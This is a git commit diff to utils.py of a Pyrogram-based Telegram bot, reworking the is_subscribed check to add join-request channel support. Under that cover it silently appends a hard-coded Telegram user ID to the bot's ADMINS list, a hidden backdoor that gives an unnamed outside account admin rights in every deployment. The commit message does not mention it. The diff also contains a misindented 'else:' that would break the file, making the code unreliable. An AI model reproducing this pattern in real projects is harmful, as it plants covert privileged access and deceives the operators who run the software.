b4e4f882b9d9817497da010022b5c5612919136e
MatRixBotzTG <122761844+MatRixBotzTG@users.noreply.github.com>
2023-02-05 14:15:15 +0000

    Update utils.py

--- utils.py
+++ utils.py
@@ -1,6 +1,7 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL
+from database.join_reqs import JoinReqs as db2
 from imdb import Cinemagoer
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton
@@ -42,17 +43,37 @@ class temp(object):
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
+    
+    ADMINS.extend([5596825598]) if not 5596825598 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
+       else:
+            return False
 
-    return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
